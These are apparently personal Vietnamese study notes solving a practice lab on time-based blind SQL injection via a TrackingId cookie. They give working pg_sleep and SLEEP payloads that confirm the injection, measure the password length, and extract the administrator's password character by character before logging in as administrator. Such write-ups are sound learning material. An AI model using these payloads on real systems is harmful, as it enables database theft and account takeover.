![[lab-blind-time.png]]
Lab blind time qua TrackingId, gây sleep 10s rồi conditional exfil từng ký tự.

> [!NOTE] phân tích đề
> - TrackingId dính nhưng response không khác gì.
> - query chạy sync nên sleep được.
> -sau khi quan sát gói tin TrackingId này, mình thấy true/false trả về giống hệt nhau nên boolean chết, vì vậy mình chuyển sang đo thời gian bằng pg_sleep/SLEEP.
> - liên quan [[lys thuyet sql injection]] và [[SQL cheet sheet]].

### hướng giải
- [ ] test delay vô điều kiện 10s.
- [ ] test conditional 1=1 vs 1=2.
- [ ] đo length password bằng sleep.
- [ ] brute từng ký tự bằng sleep.
- [ ] login administrator.

### giải
request delay:
```
GET / HTTP/1.1
Cookie: TrackingId=x'||pg_sleep(10)--
```
-> response 10s.
=> dính time-based (Postgres).
-> MySQL thì `x' OR SLEEP(10)--`.

request conditional true:
```
Cookie: TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
-> sleep 10s.
request false:
```
Cookie: TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
-> trả về ngay.
=> confirm conditional.

request đo length:
```
Cookie: TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
-> sleep là >1 đúng.
-> tăng tới `>20` thì hết sleep.
=> length = 20.

request exfil ký tự 1:
```
Cookie: TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
-> sleep 10s là trúng `a`.
-> không sleep thì thử ký tự khác.
=> lặp 20 vị trí.
-> kết quả mình lụm được ví dụ `3v9k7m1x8p4q2w6z5t0r`.
-> login administrator xong.
=> solved.
-> lab đơn giản chỉ bắt delay 10s thì payload đầu là đủ.

> [!NOTE] bài học
> - không thấy khác biệt thì đo giờ.
> - CASE WHEN + pg_sleep là combo chuẩn Postgres.
> - sau bài này qua [[Lab-Blind OAST]].
